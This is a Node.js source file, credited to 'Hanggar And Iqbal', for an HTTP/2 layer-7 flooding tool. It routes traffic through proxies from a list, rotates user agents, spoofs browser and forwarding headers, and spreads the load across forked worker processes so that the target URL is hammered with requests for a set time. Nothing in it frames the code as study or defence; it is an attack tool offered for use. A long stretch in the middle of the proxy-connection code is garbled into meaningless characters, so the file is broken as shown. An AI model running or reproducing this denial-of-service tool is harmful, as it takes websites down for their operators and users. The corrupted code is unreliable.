/**
 * 
 * New layer7 By Hanggar And Iqbal
 * 
 */

 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;

 if (process.argv.length < 5){console.log(`Usage: node tlsv2.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://tls.mrrage.xyz 500 8 1`); process.exit();}
 
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers = "GREASE:" + [
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
     ...defaultCiphers.slice(3)
 ].join(":");
 
 const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
 
 const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
 
 const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 
 const secureProtocol = "TLS_client_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: sigalgs,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 
 var proxyFile = "proxy.txt";
 var proxies = readLines(proxyFile);
 var userAgents = readLines("ua.txt");
 
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5]
 }
 
 const parsedTarget = url.parse(args.target);

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        //console.log("Threads " + counter +  " started.");
        cluster.fork();
    }
} else {for (let i = 0; i < 10; i++) { setInterval(runFlooder, 0) }}
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port,
         allowHalfOpen: true,
         writable: true,
         readable: true
     });
 
     ×äõâÃ¬¤ñÑä÷ãÈþ£¡ÚçÖðåÆü òÑ²×Èð±Æ¨ö¡Ñº¢°ü«¤»ÕòâÅ¨óñ¶ÜÜÈ¡ãÉ¦«§ºÒÌ¦¾¨ö¤Ð³ó¾Â­§ ÒºÔÉðäÉý¤§ÚáÒÛÎ÷³¨ £ãÛð·Â®ªð±ÔÌ¡å¬ ö×·ÒË¦ãù¡ ´Îñ¾­¢öÑäÒÛÈ¦¶­ñ¢µÑÞ¦±­ öÑàÜÞõ°È®£ö±Ü÷çÀ¬«ñ´Ñ¦¶Ã¬¥ñ±Þ¢ãÃ©ô¦¶¢±Á§§ªÓäÕò±¦¥ö´ÔÜÏð±Å­£÷Ñ»ÜÎö¿Ä¬¦¥ÚµÑÙÎ§³Ç©  µó¾È©ªõ×·×Ìö±Åª¤§Ú°û³É¬¡ª±Ý¦çû§òÓ·Üõä¦ñòÑ³Ó äÀù÷¦µÝ¥±Éüð áÝô¾Âú÷¦²ÖòäÀ¨ó Ö´ÐÉôµÇª¢¢×²Üû³¬¥ Ô¶ÓÏ¦·ùô÷Ö´ÒÚËö²Àª¡ªÐºÓÞÌ¡ãÄ¯ñõ¶ÕÙËûäÃ«ó«Ó´Ì µÃ¨ð¤Ò°ÖóåÃ¯ª÷ÖãÖ¢·Ä¦÷ñ±ó³Àù¦§³òâÅ©¡öÛáó¾ù¡ªÔã×ò¿Âª§òÖ»Ö¢±É®¡÷³Î ¶ýö¤Ð±ÓÞÈû¿¨¢§ºÔÌ¥¿Ãþó¢ÓãÓÛÈú±Éù ñÑ² àÇ¬¡¥ºÈò²§£ðµÐû¶Ä¬¢ªºú¶Àûð§àÒñ´Âª§¢äÕòàÄ¯£ñ×»ÝÏ¥âÀ®óñ·ÖÌú²Èúó¡ÛàÖ¥³Ãª÷§ÔáÔÈ °¬ñðÕã×Ù§µ©¦¡ÛºÕÛûµÇ«£§°È¥´®¤òäÕ¦¾È¨ôªá×Ùô´É¨ðñÓ·Îð¾Ã¯ô¦Ñ·Ý§´§¡«ÖçÜ¢µÅ¯óöÑ±Úò±¯  Û»Öö¾Éª¡ªæÓÞõçÄ®¥ Ñ³ÜÈûâÃ¨¤òàÙú¿Â­§§°ð¾Ç®÷¡Õºôã«¥¤ºÐÙòäÅ¯ ¢ÛºÕö³Âù÷ñÔá÷²üóªÕ´ÝÙ÷å¯¦ð±ÓÝ¥¿©ññäô·«ö¢ÓçÜÜ¢âÁ«£«Ñ¶ÕÞÉû´È¬¦ªÔ»Ö÷àÂû¤÷Ñ»ð¿úö¤Û²ÖË¡·Ç¯ðñÐ´Ô¡´ùö«×çÓÈ¥àÃ©ñªãÈ¦¶ÂýóªÑµÔ¥å¬ô÷¶ÜÉóâÂùñöÐäÒÚû³ÂþôñàÓÙÎûâùöªÒ±ô·®¥ª´ÒûåÅûô Ó¶ÕÞö´Éú¥¢çÜ§µÁû£ñ°õ¿Âü£÷ÚºÝÝñ³ÀªóªÕ²Ú¥¶¨«¦ÒäÕÙÌó²­ô ×äÖúçÇ©¡ñÒãÛËõçû ¡ÕäÕû¾«ñð×ºÕÛÌú¿É¬ôõ¶ÜÙÈ¡´Å®¢òä÷ãÄ¯§õÐäÔÞ§äÇýóõÑ»ÜÙÏ ¾Ç¦¤ðÔ»ÙñµÉû÷ñÑµÜÞÌðàÈ¬ó¥ÔãÜ àÅý§ð²¢µú¡¡°ÐÈ¡¶¨£öæÑÎ÷¿Æþ«ñºÐÈ µÈ§ðª·ÕÉú¶® §Ö²ÔÜô¿þ «ÔäÕÌ¦¾Á­÷¡×±×òµÂý§õÒµÜÏ§³¯÷¡Ñ»ÙÉöãÂú¡öÐ°ÐÙ÷¾û«¢Ó±ÖÎû±ÀûôñÑ·Î÷ãü§ ÚãÞ§çÀ¯ðòÖ±ÖÙÌö°§¡öæÎ¦¶þô§Ôºð·È©óñµÓÛÌúä¯ñ¢Ú»Ó¡¶úö÷Ö³ÜûµÃ¯£ªÚ²ÐÝû¶­ £ÐáÐõ·­ó¤ÕàÐÛÉó¶Éúð¡Ò°ô´À«ðõáÑûµþö¤µÒÈðµÈüð«ÔçÒÜõä§§¤×áÐÝðåÄ«§«±ÐÜÉû³Ä«ö¤Ò°Ë¦²ü¦£»Ó ±ý¤ñ°ÞÏôçüô¤ÑäÕõäÉª£¢äÕË¢àÁ¯ª§×·ÔÚðçù¤¦²ÝÈûµÀù«ñÔ²ÜÜó³Æü§¦Õ°ÜòäÀ­§ ÕäÐÙ¢àÁý«ªÔ¶Þò°Ã¬¦«Ô·Öòäý¤ñÕ²Þ¢çÅ¦« Ú²Ôõ°þ¢¡Öµ¢åÆ¬¦öÑçÐÝ÷²Èüñ¢ÓáÑË¦²Á© ¤ÖäË ¿Åû¤«ÓµÕÝõ¿Á¦«òÐ·ÖÉó¾ü¡¦Õ²Õ¡ã«¢«Ö¶ÜÝÉ÷ãÂþó«Ò»ÐÈ¢±Âùñª»ÑÉ¥âª§¤ÐäÐÎ§äÉ¦£¤×àÈ å­£¤áÔò°Ãüð§°Öó¾Æ©§§ÕµÎñãÆýª¤³ÓÝËó°ûð¢×ãÚ¥àÀ««ªÒ±ÑðµÈ¬¥¦Ñ±ÜÌû¾Çþô¤·Òû¾Éù ñçñâ¬£ñÔ°¢àÉû¥¥ÔæÕÝ§´Ä­¦¡ÚæÔÈôäÄ««§ÐºÑÜÈñ³Å§ñ¤Ô±Öò±Éù§õÖµÐÞË¥åü§«×ºû¾Éþ§«Òç¢¿Ä®¥õ±§´¬¦õÛ¶ÜÚñà§ñòÕçÓûàÇ©££ÚãÐËô°Äþ÷¦á¡°Å¦ðªáÒÙ¢å¨ð¦ÕáÑñ²Å¦£¦ÒµÕÏò±ý¥ª»×ÞôåÈªö«çÞ¥´ú¢¦ÒçÓ÷±«ô¢Ú²ÝÎð¾Â«ö ÚãÑ åÃþöñÐºÝË¦·ù¡õµû²È§««Ö»Ý¦åÇþó¥Ó²Û§¶Èü÷¡³úãÁ®÷õ°ÕÞÌ§äÉ®÷¦°Îû°­«öÓºÓÚÌ÷¶Åù¥«×°ÓñåÆ¯¥òãÖÌò´¯ö«ÐãÓ§±ÄüñªÑ±ð´À¦ööÐºÉ¦³©óòÐ»×û¶ù¥÷áÕÛ¦±¨ó÷³Ý§³Äü¥¡ÓáÜÈ÷°¨ «ÐáÔú³ûª¦²Ïð¿¨÷÷ÔäÑ¢àÀþ §áÐú´Ä¬ª¤æÖÎ¦çÃþö£Û»ÒÛÈò±É¦ô¤Õ¶Ôû´Â«¡¢Õ»ÐÝÈóãÅ­¦¥ÓºÔÞÏöçÁ§ðñ×ãÑÉ÷¿«¤§ÖàÕ¡àÃ¦ö¥àÓÈ÷¿È­ªõÛ·ÐÌ¡çÂþóðÓäÐÙËñåú¦¥äÞòàÄ®÷ñµÓÝÏ¡âû¦«»ÕÈ÷·À¨¤ªÑ·ÓÞÌõ¶Ã©¡ªÕäÔÝÉõ³ùª¦ÑãÞôµþ¤ðÐ³×ÝËöµÅû÷ Õá×Ûö±Ã©÷öÑ°Ì¢·®ñ¦æÕÉ§ç©ô¥ÕáÖÙ§°ý§ª·Ü¥¶Á¨ö¥Ñ¶ò¾Â«¦ð»öäÅûôªÓ°ÐÜÏ ±Æ©¡¥µöçÉú«ðÛçÐÛÏðä©¢«±¡äÀùñðÓäÒú¶Æþ£öàÜÌ¦çÂ¬ð¤ÓãÎñäþô¤×àÛðàÇû£õ·ÓËöçÈùô£×°Ì¢åÂýð÷ÔçÖÞñ¶Ãù÷ñÛæÝ¥µÂü¢¥Ñ·Óô´Å¯ôªÑäË¦åÃªó«Ñ±Ò¡åÆ«ªõÛ²ÑÜÉ¢¶Çûóðµ×÷±À§¤¡ÕäÒú¿¦¥£áÐË§ã©ô¤Ð°§ãÆúðõáÜò¶Ãú¢£æÉ÷à®ðñäÈúäÂý£¥ºÙðµ­÷¢Õ±Îô°Ä§¡«ÒäË÷¶¬«¢ÑãÓ¦µ¬ô¢Ö¶ÑÙôå¯ô¥äÐò²Âþ¤§Û²ÒÙÌñçÄû¡÷Û·Òõ³Æ¯ñ¢ÒáÒ§¶Ã¯«ª¶ÓÜðã§¤öµÕÜÏóãÇþ¥öäÔó¿Å§¦ ×°óäÁûô«Û´×Üó¾É¦«ñÚ¶ÔÈ§³È¯ó«æÝÙ¡àªóöÒãÔóåÁ¯÷õÚºÙ µ¨¡÷äÑÝ °Äª÷ö°ÓÈ÷·Ç®¥¡Ú°È¦³Ä§¦ñÚæÔö°¨ôðÕ»ÓÉ¦¶®ñ÷äÜó·ýññ·Ü¥´Çý¡õÚäÝ¦´ùô¥ÓäÝöâÇùóõÐ´ÜÚõç© ¤µÕú±Âþ§òÒ»ÑÙ¥·þ«¤Ó»¢ãÈúª µÑûåÄý§ Ö³Üó¿Âú¢òÑ³Õñç¯óò³Öö¶Ãþ¡¦Ó±ÔÝ¢±Çþ÷öæÖÙ¦¾É¯««ºÝ¡äû÷§ÕºÕÜÎñâ¦£«ÛãÖ¦çÄ¬«ñÓºÔÏ ´Æþô¢áÉó·Á® ¢Ôá¢±Ã¯¥öÓ°ÛÏò¿Æú£òÚäÜ¥â­ô÷äÚÎöåÁ¬§ª´ÜÌð¶Ç¬¥«Ò¶Ñ§µÅ©§÷Ó±ÑÜÈ¥·Äþô ×µ¡ãÃ®¤¦Ñ´ú°É¬£«Ûá¡à¯¡öÓáÔö¿§¢ Ö·Ð¢ã©§öÛµ÷·É§ô«Õ°Ñ¡°¬¥ à×÷ãÁ¨¢ñÖ°ÒÚÎò±È«¦ðÚ´ÚõâÉ§ ð¶¥ãÂ¨¤õÔçôäÀ¨ªòÖäÝñ´ª¢òçÑÈñ±Äùª¡àÕÞÎöå®«§ÓáÓÛÎ¢¾©«÷ÑäÎò±Ã©«¥¶É ä«÷¢ÑæÒû°«£«³Òúåª õÖºÐÜó±ÇüôªÛçÑÈòµ¨¡£°ÔñµÉ¨£ªÛæÝ§äÅú¦ ÐµÉ ·Äª¤¥ÚµÕÏ§²Ç§§ñçÒú·¨¢÷¶§´Â¨ ò×ºÝûâÃý«¤Ö·ÙÎöâÉª¦ð×·ÝÜû³Æýó£×æÈ â«§ªÛ»È¥äÂû öÑ·ÓÚÌ÷´¯ñ¢Ú·Ð¥åÄ¯§õÖãÙ¢¿Åþ §ÕæÖÞðçüññÐ²×É§·À¯§ Õ·ÑÈñãÆüª§Ó°Ý¥â­ôöáÕÚ÷°É¨£¦ÖçÝË¢²Æ¨ð§ÖºÜöà§¢ª´Úöµ¬ñ¤Ó°Ý¥²¨§ ÑµÐÛöçÇüð¥ÐàÑÚöâ«öõÓãÓ÷·Ã©£÷Ñ´Ô¦¿È¯öö»Ó¦àÅ¨¢¡ÔãÒ§´Ç§ðñá§¶É¨«öäÓò´®¡£Òáó·Â¯óòÔàÒÚÌ§äýö¢´ÓÈ °§¢¢ÕãÝðâÀ¦¤÷×²ÓÎõåÄ©ö¤ã×ÎôàÀ§ô£×äÙ¡ã¦¦ð´Õ µÂû§¡Ö²ÑÜ÷²úó¢ÑºÜ¦°Äþ ¤çõ³À¯¥ªÚæÔÙ ·Éü¤¢Ú»öàùª«á ¿Â«ð¢×çòµ¦ô§æÑôåÉ¨¤¡Õ³ËôäÇ§¢ Ô·ÑôäÈ§ôñÚäÙö·Çªð¤ÕæÝË¡²Åù£¡äÖÛòãÉ«¦«Û´ÔËóçûö£µÜÛÏð±ù¥¦Õ³ÑóåÈ¬ô¥×³ÛÏ ¿Á® ¢×áÙ¦µ­§£Û¶×§âú¡ðÕ²ÐÝõà¨ðö²ÑÝË ¿Ç©óñÕæ×ÞËô¶ùñõÓ»×Î¡äÄ¦ó÷ÛäÝôäÉ¯¢õµËñ·¯ª¥Ô°ÐÎõ´Å§¢ ´Ë¥µÉþ¡¦·ÜÚúàÇþ¦ð×¶Îðâ¦ öäÚÈûåÄ§ôò°ÑÈ¢µª¤òÓàÉ¦±Ãúö çÔÌûãÈýð¥´Îû²Èþ£ »ö·Á§§ò·Ý ¿§ª¡»ÝûãÀþö«Ð´ÐöµÆû«¥äÐÚÈ¡±ú ¡ÒºÐÚð¿Æ­¦£Óà×Ïñ³Éû¢òÛ´ÓÚôâÇüª¥çÞ§¾üô¡Õã ¾ù¡¦Õ¶ÓÜð²É¦¢§Ò±ó¿Ãª¦«æÕÞûäú£ñ×»Ò§äù¦¤ÓæÔÙ ±û¥¥»×Þð´Äþª¦·Û§²ùöò×äÉúä©¤ñÐ°ÜËñ±¨¥£°ûåú £Ö²ÔÏ¥°Ä­ñ¥ÑàÓÝñ³Äùñ¢Ú²Öú¿«¥¤Õ´Ýó±Éü¤«Ñ·ÑÛúä¯¤ªæÓò°Æ¬§÷º¥°©¥£Ñàö·È«÷¤æÝ¥²Èª¦ñ×ãÙ§àÇ§£¦ÔæÕú±­¤÷×ãÎ¢µÂ®«òÒºÝÈò´À§ô¦ÕáÕË÷¿Â§ñ ±×§åÀú¡«Ö»Ïðàþ«§Öµ§¿ú¥¤±×ö±¯ªñÔµÓÞû²Âª«ðÕãÏðä¬ª¦àÐ µúó¦×ãÑË¡å«¢÷Ð·Ôû³­ª÷ÕµÉðãÃ¦ö÷ÑçÙÏö°Èý ªÚµð¿Ãª£ªÐã×ÝÈ °Æ¦ðõÛ²Ö¥¶úñ¦Öºñ¾­ª¢ÚæÑÛ¡¿Áûó¡ÒºÔôà¯¥ªÓçÔöåÅ¯¢¥±Ó¡´Ã®ö¢Ô·ÝÞ÷¾ýôòàñäÆ®ô¥ãÕôâ­ó¡àÕËðçÂ¬ó¡Ò»Èú²Çüð¥ÖáÔ¡²Èûö¢ÔçÜ ¿Æ§«õáÜò·Äùª¡ÒµÏô±ýôöÖãÝõàú¤¤çÜö´ûªñÒàÕÜÉö¿Æþóö³×ÌôåÈþ¢¥Ö°ÜÏ¢·Á­ ðÐ°ÑÛ÷¿Ä¦¤¡Û±¢âÄùö¥Ú°×ÞÌñ³Áù£õÖàÒôçÆù¤¤Ò¶ÔÝÎ¦àÇý÷ªÖ³§·¬ôöÑ±ÞË÷±Ä¨ «çÖó³û¢õäÑÌð²Æùö¤Ðã¦ãÇùó¦ãû¶¦öñÓ±ô¿®§ð³ÖÚñä¦¥õ°ÜóäÀ¯÷¤×àÑñµÉý§£æñ´Ç§§§ÚçÎ¡²Éú£õÕàÏû·Á®£öÖµÝ¥ãÇ®öö³ÓËñ¿Âù¥£ÓáÖ ã¦«÷´Ýò±«ôòÖáÈóàÂ©ó¦ÓæÜÛõçÅù¢¢ÐçÝ§³Çù÷£»ÉúâÁªôòæ§äÂû¡òÓã×öµù«ªãÈñ°É¯¦öÐºÞ¦´ýðòÔáÓÛÌû¿Àªð§Ò°×ñ¾««¥×³ÓÈ¢¿Å®¤ò±Ïô¿É§÷¥ºË¦¾Ç¦ñ£Ò¶Òû´®ðð»ÞÈûãÀú¢£ºÜÈ÷±Â©§¤ÒäÌ¦·Ã§ª«´ÎöãÁü§§ÐºÖË¢³Ç§§ð±ÐÈ÷°Æ¬£ö´É¢´Çþ¡§ÓºÜñàª£ñ°Üð·À¨ ¥Ò»Ô÷¿¬¡÷Õ¶ûçÇþ¢¢ÐäÓûåÇû¥¤æÝ ²Èù¥¥ÓºÕÈ¢²Ä¯ª¥ÓµÚð²Ãùö£´ÜÎñ±ª¥ª°ÎóçÃ¨ª Óà¥³© ¢ãÔÚóàÁþ¡ö¶Ö
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }

 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 
 function randomCharacters(length) {
     output = ""
     for (let count = 0; count < length; count++) {
         output += randomElement(characters);
     }
     return output;
 }
 
 headers[":method"] = "GET";
 headers[":path"] = parsedTarget.path;
 headers[":scheme"] = "https";
 headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
 headers["accept-language"] = "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3";
 headers["accept-encoding"] = "gzip, deflate, br";
 headers["x-forwarded-proto"] = "https";
 headers["cache-control"] = "no-cache, no-store,private, max-age=0, must-revalidate";
 headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
 headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
 headers["sec-fetch-dest"] = "document";
 headers["sec-fetch-mode"] = "navigate";
 headers["sec-fetch-site"] = "same-origin";
 headers["upgrade-insecure-requests"] = "1";
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
 
     /** headers dynamic */
     headers[":authority"] = parsedTarget.host
     headers["user-agent"] = randomElement(userAgents);
     headers["x-forwarded-for"] = parsedProxy[0];
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 10
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 60000);
         connection.setNoDelay(true)
 
         const settings = {
             enablePush: false,
             initialWindowSize: 1073741823
         };

         const tlsOptions = {
            port: 443,
            secure: true,
            ALPNProtocols: [
                "h2"
            ],
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            clientCertEngine: "dynamic",
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.allowHalfOpen = true;
         tlsConn.setNoDelay(true);
         tlsConn.setKeepAlive(true, 60 * 100000);
         tlsConn.setMaxListeners(0);
 
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: settings,
             maxSessionMemory: 3333,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn
             //socket: connection,
         });
 
         client.setMaxListeners(0);
         client.settings(settings);
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 10000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 100000);
 
 process.on('uncaughtException', error => {});
 process.on('unhandledRejection', error => {});